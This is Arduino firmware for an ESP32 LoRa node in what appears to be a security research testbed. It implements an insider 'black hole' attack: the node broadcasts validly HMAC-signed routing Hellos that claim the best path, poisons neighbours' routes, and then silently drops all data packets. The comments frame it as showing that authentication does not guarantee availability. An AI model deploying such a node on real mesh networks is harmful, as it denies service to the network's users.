// E7 — Node C: BLACK HOLE ATTACKER (Insider Threat)
//
// This attacker HOLDS THE NETWORK PSK and signs its Hello messages
// with a VALID HMAC. Patched nodes (SECURITY_MODE=1) will accept
// the Hello because HMAC verification passes.
//
// Attack sequence:
//   1. Broadcast Hello(src=0xCC, metric=0, HMAC=VALID) every 8s
//   2. All patched honest nodes update routing table: NH=0xCC, metric=1
//   3. Node A sends data to 0xCC (thinking it's the best path)
//   4. This node receives data but SILENTLY DROPS everything
//   5. Gateway (0xBB) receives 0 packets → PDR = 0%
//
// This demonstrates: HMAC patch prevents UNAUTHENTICATED injection
// but cannot prevent a COMPROMISED INSIDER from executing a black hole.
// Authentication ≠ Availability.
//
// Expected serial output:
//   [BLACKHOLE] Signed Hello sent: seq=N valid_hmac=YES metric=0
//   [BLACKHOLE] DROP data from 0xAA pkt_id=N (total dropped=N)
//   [BLACKHOLE] Gateway will observe: PDR=0% despite HMAC patch
//
// Board: Ebyte EoRa PI (ESP32-S3FH4R2)  FQBN: esp32:esp32:esp32s3:CDCOnBoot=cdc

#define NODE_ID          0xCC
#define GATEWAY_ID       0xBB
#define ATTACK_PERIOD_MS  8000   // inject just before gateway's 10s Hello

#include "../e7_common.h"
#include <Wire.h>
#include "SSD1306Wire.h"

SSD1306Wire oled(0x3c, 18, 17);

SPIClass spi(FSPI);
Module*  mod   = nullptr;
SX1262*  radio = nullptr;

volatile bool rxFlag = false;
void IRAM_ATTR onDio1() { rxFlag = true; }

uint16_t atk_seq       = 0;
uint32_t hello_count   = 0;
uint32_t drop_count    = 0;
uint32_t last_atk      = 0;
uint32_t last_oled     = 0;

void oled_draw() {
  oled.clear();
  oled.setFont(ArialMT_Plain_10);
  oled.setTextAlignment(TEXT_ALIGN_LEFT);
  oled.drawString(0,  0, "NODE C  BLACKHOLE");
  char buf[32];
  snprintf(buf, sizeof(buf), "Hello cnt=%lu SIGNED", hello_count);
  oled.drawString(0, 14, buf);
  snprintf(buf, sizeof(buf), "DROP cnt=%lu", drop_count);
  oled.drawString(0, 28, buf);
  oled.drawString(0, 42, "HMAC VALID insider");
  oled.display();
}

void send_blackhole_hello() {
  HelloMsg h = {};
  h.type   = MSG_HELLO;
  h.src    = NODE_ID;    // 0xCC — attacker's real address
  h.dst_gw = GATEWAY_ID;
  h.metric = 0;          // claim metric=0: "I am the gateway"
  h.seq    = atk_seq++;
  // CRITICAL DIFFERENCE from E6 attacker:
  // Sign with valid NETWORK_PSK — patched nodes WILL accept this
  sign_hello(&h);

  radio->transmit((uint8_t*)&h, sizeof(h));
  radio->startReceive();
  hello_count++;

  Serial.printf("[BLACKHOLE] Hello sent: seq=%u metric=0 HMAC=VALID (#%lu)\n",
                h.seq, hello_count);
  Serial.println("[BLACKHOLE] Honest nodes will update: NH=0xCC metric=1");
  Serial.println("[BLACKHOLE] HMAC patch: ACCEPTS (PSK valid) → route poisoned");
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== E7 Node C (BLACK HOLE ATTACKER — INSIDER) ===");
  Serial.println("[INFO] This node holds NETWORK_PSK and signs Hellos validly.");
  Serial.println("[INFO] Finding: HMAC patch does NOT prevent insider black hole.");
  Serial.println("[INFO] Authentication proves origin, not forwarding behavior.");

  Wire.begin(18, 17);
  oled.init(); oled.flipScreenVertically();
  oled_draw();

  eora_radio_init();
  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  int st = radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
                        LORA_SYNC, LORA_POWER, 8, LORA_TCXO);
  if (st != RADIOLIB_ERR_NONE) {
    Serial.printf("[ERR] Radio init: %d\n", st);
    while (true) delay(1000);
  }
  radio->setDio1Action(onDio1);
  radio->startReceive();
  Serial.println("[RADIO] SX1262 ready @ 923 MHz AS923");

  // Send first attack immediately to race gateway's first Hello
  delay(200);
  send_blackhole_hello();
  last_atk = millis();
}

void loop() {
  uint32_t now = millis();

  if (now - last_atk  >= ATTACK_PERIOD_MS) { last_atk  = now; send_blackhole_hello(); }
  if (now - last_oled >= 5000)             { last_oled = now; oled_draw(); }

  if (rxFlag) {
    rxFlag = false;
    uint8_t buf[256];
    size_t  pkt_len = radio->getPacketLength();
    int     state   = radio->readData(buf, sizeof(buf));
    radio->startReceive();

    if (state != RADIOLIB_ERR_NONE || pkt_len == 0) return;

    if (buf[0] == MSG_DATA && pkt_len >= sizeof(DataMsg)) {
      DataMsg *d = (DataMsg*)buf;
      drop_count++;
      Serial.printf("[BLACKHOLE] DROP data src=0x%02X dst=0x%02X "
                    "pkt_id=%u (total_dropped=%lu)\n",
                    d->src, d->dst, d->pkt_id, drop_count);
      Serial.println("[BLACKHOLE] Gateway sees: SILENCE (PDR=0%)");
      oled_draw();
      // Intentionally NOT forwarding — this is the black hole behavior
    }
    else if (buf[0] == MSG_HELLO && pkt_len >= sizeof(HelloMsg)) {
      HelloMsg *h = (HelloMsg*)buf;
      if (h->src != NODE_ID) {
        Serial.printf("[SNIFF] Hello from 0x%02X metric=%u seq=%u\n",
                      h->src, h->metric, h->seq);
      }
    }
  }
}
